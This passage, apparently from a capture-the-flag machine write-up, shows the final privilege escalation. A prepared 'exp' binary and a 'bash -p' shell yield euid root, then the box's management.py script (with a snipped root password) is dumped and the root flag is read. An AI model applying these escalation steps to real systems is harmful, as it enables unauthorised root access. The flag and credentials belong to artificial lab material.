-rwxrwxr-x  1 wesley   wesley  751728 Aug  7 06:56 exp
drwxrwxrwt  2 root     root      4096 Aug  7 07:05 .font-unix
drwxrwxrwt  2 root     root      4096 Aug  7 07:05 .ICE-unix
drwx------  3 root     root      4096 Aug  7 07:05 systemd-private-f599daf64e1044079c3bb2a98ee142dc-ModemManager.service-yNsM7h
drwx------  3 root     root      4096 Aug  7 07:05 systemd-private-f599daf64e1044079c3bb2a98ee142dc-systemd-logind.service-qlerNf
drwx------  3 root     root      4096 Aug  7 07:05 systemd-private-f599daf64e1044079c3bb2a98ee142dc-systemd-resolved.service-g5Q0hf
drwx------  3 root     root      4096 Aug  7 07:05 systemd-private-f599daf64e1044079c3bb2a98ee142dc-systemd-timesyncd.service-xy7VLi
drwxrwxrwt  2 root     root      4096 Aug  7 07:05 .Test-unix
drwx------  2 root     root      4096 Aug  7 07:06 vmware-root_689-4021587913
drwxrwxrwt  2 root     root      4096 Aug  7 07:05 .X11-unix
drwxrwxrwt  2 root     root      4096 Aug  7 07:05 .XIM-unix
```

```c
bash-5.0$ ./bash -p
bash-5.0# id
uid=1000(wesley) gid=1000(wesley) euid=0(root) groups=1000(wesley)
```

## Closing

```c
bash-5.0# cat management.py
import paramiko
import time
import os

while True:
    print("Deleting files")

    for file_name in os.listdir("/var/lib/postgresql/"):
        if file_name != "12":
            os.remove(os.path.join("/var/lib/postgresql/", file_name))

    # This gives people 60 seconds to get their payload within .bashrc
    time.sleep(60)

    print("SSHing")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("localhost", username="root", password="QzN<--- SNIP --->7kq")

    chan = ssh.get_transport().open_session()
    chan.get_pty()
    chan.invoke_shell()
    chan.send(b'/bin/bash -i ./manage-db\n')
    time.sleep(5)
    chan.send(b"psql\n")
    time.sleep(30)

    if not chan.closed:
        chan.close()
```

| Username | Password |
| --- | --- |
| root | QzN<--- SNIP --->7kq |

## root.txt

```c
bash-5.0# cat /root/root.txt
be506cd767d3b0b491418362488fa600
```
